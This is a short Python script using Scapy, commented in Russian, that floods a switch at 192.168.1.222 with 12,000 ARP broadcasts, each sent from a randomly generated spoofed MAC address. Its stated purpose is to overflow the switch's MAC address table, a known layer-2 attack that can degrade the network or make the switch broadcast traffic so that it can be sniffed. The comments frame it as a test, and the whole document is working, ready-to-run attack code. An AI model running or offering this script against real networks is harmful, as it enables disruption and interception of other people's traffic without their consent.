import random
from scapy.all import ARP, Ether, sendp
import time

def generate_random_mac():
    """Генерирует случайный MAC-адрес."""
    mac = [0x00, 0x16, 0x3e,
           random.randint(0x00, 0x7f),
           random.randint(0x00, 0xff),
           random.randint(0x00, 0xff)]
    return ':'.join(map(lambda x: f"{x:02x}", mac))

def send_arp_request(target_ip, fake_mac):
    """Отправляет ARP-запрос с фиктивным MAC-адресом."""
    ether_frame = Ether(src=fake_mac, dst="ff:ff:ff:ff:ff:ff")
    arp_request = ARP(pdst=target_ip)
    packet = ether_frame / arp_request
    sendp(packet, verbose=False)
    print(f"{fake_mac}")

def flood_mac_table(target_ip, count, delay):
    """Отправляет указанное количество ARP-запросов с разными MAC-адресами."""
    for _ in range(count):
        fake_mac = generate_random_mac()
        send_arp_request(target_ip, fake_mac)
        time.sleep(delay)

# Указываем целевой IP коммутатора и количество пакетов
target_ip = "192.168.1.222" # IP-адрес коммутатора
packet_count = 12_000 # Количество отправляемых пакетов
delay_in_seconds = 0.001 # задержка между отправками пакетов

# Запускаем тест на переполнение mac-таблицы коммутатора
flood_mac_table(target_ip, packet_count, delay_in_seconds)